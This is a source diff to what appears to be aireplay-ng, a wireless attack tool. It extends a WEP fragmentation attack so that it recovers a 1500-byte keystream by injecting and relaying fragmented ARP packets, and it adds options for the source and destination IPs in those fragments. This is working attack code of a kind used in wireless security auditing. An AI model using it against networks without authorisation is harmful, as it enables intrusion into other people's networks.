@@ -128,6 +128,8 @@ char usage[] =
 "      -e essid  : fakeauth  attack : set target AP SSID\n"
 "      -j        : arpreplay attack : inject FromDS pkts\n"
 "      -g value  : change ring buffer size (default: 8)\n"
+"      -k IP     : set destination IP in fragments\n"
+"      -l IP     : set source IP in fragments\n"
 /*
 "\n"
 "  WIDS evasion options:\n"
@@ -610,7 +612,7 @@ int fake_ska_auth_1( void )
     send_packet(ska_auth1, 30);
     send_packet(ack, 14);
 
-    printf("Step1: Authentication\n");
+    printf("Part1: Authentication\n");
 
     gettimeofday(&tv, NULL);
     gettimeofday(&tv2, NULL);
@@ -730,7 +732,7 @@ int fake_asso()
 
     uchar *capa;	//Capability Field from beacon
 
-    printf("Step2: Association\n");
+    printf("Part2: Association\n");
 
 
     capa = (uchar *) malloc(2);
@@ -772,7 +774,7 @@ int fake_asso()
         gettimeofday(&tv2, NULL);
         if (((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 500*1000)
         {
-            printf ("\nNot answering...\n\n");
+            printf ("\nNot answering...(Step3)\n\n");
             return -1;
         }
     }
@@ -2685,6 +2687,7 @@ int do_attack_fragment()
     int gotit    = 0;
     int again    = 0;
     int n        = 0;
+    int length   = 0;
 
 
     if( memcmp( opt.f_bssid, NULL_MAC, 6 ) == 0 )
@@ -2701,7 +2704,7 @@ int do_attack_fragment()
 
     if( memcmp( opt.r_sip, NULL_MAC, 4 ) == 0 )
     {
-        printf( "Please specify a source IP (-k).\n" );
+        printf( "Please specify a source IP (-l).\n" );
         return( 1 );
     }
 
@@ -2990,15 +2993,100 @@ int do_attack_fragment()
         memcpy(prga, packet+28, 408);
         xor_keystream(prga, h80211+24, 408);
 
+        round = 0;
+        again = RETRY;
+        while(again == RETRY)
+        {
+            again = 0;
+
+            memcpy(iv, packet+24, 4);
+            printf("Trying to get 1500 bytes of a keystream\n");
+
+            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 1500);
+            arplen=1500;
+            if ((round % 2) == 1)
+            {
+                printf("Trying a LLC NULL packet\n");
+                memset(h80211+24, '\x00', 1508);
+                arplen+=32;
+            }
+
+            send_fragments(h80211, arplen, iv, prga, 300);
+            //Plus an ACK
+            send_packet(ack, 10);
+
+            gettimeofday( &tv, NULL );
+
+            gotit=0;
+            while (!gotit)  //waiting for relayed packet
+            {
+                caplen = read_packet(packet, 4096);
+
+                if (packet[0] == '\x08') //Is data frame
+                {
+                    if (packet[1] & 2)  //Is a FromDS packet
+                    {
+                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC
+                        {
+                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
+                            {
+                                if (caplen > 1496)  //Is short enough
+                                {
+                                    //This is our relayed packet!
+                                    printf("Got RELAYED packet!!\n");
+                                    gotit = 1;
+                                    isrelay = 1;
+                                }
+                            }
+                        }
+                    }
+                }
+                gettimeofday( &tv2, NULL );
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (500*1000) && !gotit) //wait 500ms for an answer
+                {
+                    printf("No answer, repeating...\n");
+                    round++;
+                    again = RETRY;
+                    if (round > 10)
+                    {
+                        printf("Still nothing, quitting with 408 bytes.\n");
+                        again = NEW_IV;
+                    }
+                    break;
+                }
+            }
+        }
+
+        if(again == NEW_IV) length = 408;
+        else length = 1500;
+
+        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, length);
+        if (caplen == length+8)
+        {
+            //Thats the ARP packet!
+            printf("Thats our ARP packet!\n");
+        }
+        if (caplen == length+40)
+        {
+            //Thats the LLC NULL packet!
+            printf("Thats our LLC Null packet!\n");
+            memset(h80211+24, '\x00', length+8);
+        }
+
+        memcpy(iv, packet+24, 4);
+        memcpy(prga, packet+28, length);
+        xor_keystream(prga, h80211+24, length);
+
+
         lt = localtime(&tv.tv_sec);
         memset( strbuf, 0, sizeof( strbuf ) );
         snprintf( strbuf,  sizeof( strbuf ) - 1,
                   "fragment-%02d%02d-%02d%02d%02d.xor",
                   lt->tm_mon + 1, lt->tm_mday,
                   lt->tm_hour, lt->tm_min, lt->tm_sec );
-        save_prga(strbuf, iv, prga, 432);
+        save_prga(strbuf, iv, prga, length+24);
 
-        printf("Now you can build a packet with packetforge-ng out of that keystream\n");
+        printf("Now you can build a packet with packetforge-ng out of that %d bytes keystream\n", length);
 
         done=1;
 
@@ -3321,12 +3409,12 @@ int main( int argc, char *argv[] )
 
             case 'k' :
 
-                inet_aton( optarg, (struct in_addr *) opt.r_sip );
+                inet_aton( optarg, (struct in_addr *) opt.r_dip );
                 break;
 
             case 'l' :
 
-                inet_aton( optarg, (struct in_addr *) opt.r_dip );
+                inet_aton( optarg, (struct in_addr *) opt.r_sip );
                 break;
 
             case 'y' :
